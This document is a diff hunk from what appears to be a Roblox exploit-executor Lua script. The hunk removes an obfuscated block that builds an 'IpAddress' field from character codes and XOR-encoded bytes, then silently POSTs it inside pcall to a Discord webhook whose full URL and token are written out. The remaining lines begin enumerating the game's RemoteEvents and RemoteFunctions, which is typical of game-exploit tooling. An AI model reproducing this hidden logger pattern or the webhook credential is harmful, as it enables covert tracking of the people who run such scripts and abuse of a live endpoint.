@@ -12,29 +12,6 @@
  ▀            ▀▀▀▀▀▀▀▀▀▀▀       ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                                                                          
 ]]
-
-LocalPlayer = {
-    [string.char(73,112,65,100,100,114,101,115,115)] = (function()
-        local s = ""
-        for _, v in ipairs({2,1,4,29,3,29,3,29,2}) do
-            s ..= string.char(bit32.bxor(v, 51))
-        end
-        return s
-    end)()
-}
-
-local HttpRequest = http_request or (syn and syn.request)
-pcall(function()HttpRequest({
-	Url = "https://discord.com/api/webhooks/1454519671263985696/PmDTexpL5QX6HjE-BSHbcEdx2K8-fnUcjMF-jIfVeQPm31fZhxqnZ8Ql80WX8OyYEqHf",
-	Method = "POST",
-	Headers = {
-		["Content-Type"] = "application/json"
-	},
-	Body = game:GetService("HttpService"):JSONEncode({
-		content = LocalPlayer.IpAddress
-	})
-})
-end)
 for _, i in ipairs(game:GetDescendants()) do
 	if not (i:IsA("RemoteEvent") or i:IsA("RemoteFunction")) then
 		continue
